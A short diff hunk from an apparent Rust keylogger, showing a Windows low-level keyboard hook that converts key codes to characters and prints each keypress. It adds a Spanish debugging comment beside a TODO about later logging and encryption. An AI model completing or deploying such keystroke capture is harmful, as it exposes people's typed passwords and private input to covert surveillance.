@@ -159,6 +159,7 @@ unsafe extern "system" fn low_level_keyboard_proc(
                 _ => format!("[{}]", vk_code),
             };
             
+            // Print con fines de debugging
             println!("Key pressed: {}", key_char);
             // TODO: Aquí llamar a función de logging/encryption
         }
